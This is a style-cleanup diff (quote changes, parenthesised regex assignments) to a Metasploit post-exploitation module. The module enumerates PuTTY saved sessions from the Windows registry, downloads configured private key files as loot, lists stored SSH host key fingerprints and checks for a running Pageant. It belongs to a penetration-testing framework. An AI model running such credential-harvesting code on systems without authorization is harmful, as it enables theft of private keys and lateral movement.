@@ -10,14 +10,14 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
 
   INTERESTING_KEYS = ['HostName', 'UserName', 'PublicKeyFile', 'PortNumber', 'PortForwardings', 'ProxyUsername', 'ProxyPassword']
-  PAGEANT_REGISTRY_KEY = "HKCU\\Software\\SimonTatham\\PuTTY"
+  PAGEANT_REGISTRY_KEY = 'HKCU\\Software\\SimonTatham\\PuTTY'
   PUTTY_PRIVATE_KEY_ANALYSIS = ['Name', 'HostName', 'UserName', 'PublicKeyFile', 'Type', 'Cipher', 'Comment']
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => "PuTTY Saved Sessions Enumeration Module",
+        'Name' => 'PuTTY Saved Sessions Enumeration Module',
         'Description' => %q{
           This module will identify whether Pageant (PuTTY Agent) is running and obtain saved session
           information from the registry. PuTTY is very configurable; some users may have configured
@@ -51,7 +51,7 @@ class MetasploitModule < Msf::Post
         newses[key] = registry_getvaldata("#{PAGEANT_REGISTRY_KEY}\\Sessions\\#{ses}", key).to_s
       end
       all_sessions << newses
-      report_note(host: target_host, type: "putty.savedsession", data: newses, update: :unique_data)
+      report_note(host: target_host, type: 'putty.savedsession', data: newses, update: :unique_data)
     end
     all_sessions
   end
@@ -59,7 +59,7 @@ class MetasploitModule < Msf::Post
   def display_saved_sessions_report(info)
     # Results table holds raw string data
     results_table = Rex::Text::Table.new(
-      'Header' => "PuTTY Saved Sessions",
+      'Header' => 'PuTTY Saved Sessions',
       'Indent' => 1,
       'SortIndex' => -1,
       'Columns' => ['Name'].append(INTERESTING_KEYS).flatten
@@ -76,14 +76,14 @@ class MetasploitModule < Msf::Post
 
     print_line
     print_line results_table.to_s
-    stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Saved Sessions List")
+    stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, 'PuTTY Saved Sessions List')
     print_good("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
   end
 
   def display_private_key_analysis(info)
     # Results table holds raw string data
     results_table = Rex::Text::Table.new(
-      'Header' => "PuTTY Private Keys",
+      'Header' => 'PuTTY Private Keys',
       'Indent' => 1,
       'SortIndex' => -1,
       'Columns' => PUTTY_PRIVATE_KEY_ANALYSIS
@@ -136,7 +136,7 @@ class MetasploitModule < Msf::Post
         all_ssh_host_keys[host_port] = [] if all_ssh_host_keys[host_port].nil?
         all_ssh_host_keys[host_port] << newkey['type']
       end
-      report_note(host: target_host, type: "putty.storedfingerprint", data: newkey, update: :unique_data)
+      report_note(host: target_host, type: 'putty.storedfingerprint', data: newkey, update: :unique_data)
     end
     all_ssh_host_keys
   end
@@ -144,7 +144,7 @@ class MetasploitModule < Msf::Post
   def display_stored_host_keys_report(info)
     # Results table holds raw string data
     results_table = Rex::Text::Table.new(
-      'Header' => "Stored SSH host key fingerprints",
+      'Header' => 'Stored SSH host key fingerprints',
       'Indent' => 1,
       'SortIndex' => -1,
       'Columns' => ['SSH Endpoint', 'Key Type(s)']
@@ -159,7 +159,7 @@ class MetasploitModule < Msf::Post
 
     print_line
     print_line results_table.to_s
-    stored_path = store_loot('putty.storedfingerprints.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Stored SSH Host Keys List")
+    stored_path = store_loot('putty.storedfingerprints.csv', 'text/csv', session, results_table.to_csv, nil, 'PuTTY Stored SSH Host Keys List')
     print_good("PuTTY stored host keys list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.storedfingerprint' to view).")
   end
 
@@ -198,16 +198,16 @@ class MetasploitModule < Msf::Post
             else
               private_key['Cipher'] = '(Unrecognised)'
             end
-          elsif rx = /^PuTTY-User-Key-File-2:\sssh-(?<keytype>rsa|dss)[\r\n]/.match(ppk.to_s)
+          elsif (rx = /^PuTTY-User-Key-File-2:\sssh-(?<keytype>rsa|dss)[\r\n]/.match(ppk.to_s))
             # This is an SSH2 header
             private_key['Type'] = "ssh2 (#{rx[:keytype]})"
-            if rx = /^Encryption:\s(?<cipher>[-a-z0-9]+?)[\r\n]/.match(ppk.to_s)
+            if (rx = /^Encryption:\s(?<cipher>[-a-z0-9]+?)[\r\n]/.match(ppk.to_s))
               private_key['Cipher'] = rx[:cipher]
             else
               private_key['Cipher'] = '(Unrecognised)'
             end
 
-            if rx = /^Comment:\s(?<comment>.+?)[\r\n]/.match(ppk.to_s)
+            if (rx = /^Comment:\s(?<comment>.+?)[\r\n]/.match(ppk.to_s))
               private_key['Comment'] = rx[:comment]
             end
           end
@@ -225,7 +225,7 @@ class MetasploitModule < Msf::Post
   # Entry point
   def run
     # Look for saved sessions, break out if not.
-    print_status("Looking for saved PuTTY sessions")
+    print_status('Looking for saved PuTTY sessions')
     saved_sessions = registry_enumkeys("#{PAGEANT_REGISTRY_KEY}\\Sessions")
     if saved_sessions.nil? || saved_sessions.empty?
       print_error('No saved sessions found')
@@ -239,7 +239,7 @@ class MetasploitModule < Msf::Post
       display_saved_sessions_report(all_saved_sessions)
 
       # If the private key file has been configured, retrieve it and save it to loot
-      print_status("Downloading private keys...")
+      print_status('Downloading private keys...')
       private_key_info = grab_private_keys(all_saved_sessions)
       if !private_key_info.nil? && !private_key_info.empty?
         print_line
@@ -251,7 +251,7 @@ class MetasploitModule < Msf::Post
 
     # Now search for SSH stored keys. These could be useful because it shows hosts that the user
     # has previously connected to and accepted a key from.
-    print_status("Looking for previously stored SSH host key fingerprints")
+    print_status('Looking for previously stored SSH host key fingerprints')
     stored_ssh_host_keys = registry_enumvals("#{PAGEANT_REGISTRY_KEY}\\SshHostKeys")
     if stored_ssh_host_keys.nil? || stored_ssh_host_keys.empty?
       print_error('No stored SSH host keys found')
@@ -260,10 +260,10 @@ class MetasploitModule < Msf::Post
       print_status("Found #{stored_ssh_host_keys.count} stored key fingerprint#{stored_ssh_host_keys.count > 1 ? 's' : ''}")
 
       # Retrieve the saved session details & print them to the screen in a report
-      print_status("Downloading stored key fingerprints...")
+      print_status('Downloading stored key fingerprints...')
       all_stored_keys = get_stored_host_key_details(stored_ssh_host_keys)
       if all_stored_keys.nil? || all_stored_keys.empty?
-        print_error("No stored key fingerprints found")
+        print_error('No stored key fingerprints found')
       else
         display_stored_host_keys_report(all_stored_keys)
       end
@@ -271,12 +271,12 @@ class MetasploitModule < Msf::Post
 
     print_line # Just for readability
 
-    print_status("Looking for Pageant...")
-    hwnd = client.railgun.user32.FindWindowW("Pageant", "Pageant")
+    print_status('Looking for Pageant...')
+    hwnd = client.railgun.user32.FindWindowW('Pageant', 'Pageant')
     if hwnd['return']
       print_good("Pageant is running (Handle 0x#{sprintf('%x', hwnd['return'])})")
     else
-      print_error("Pageant is not running")
+      print_error('Pageant is not running')
     end
   end
 end
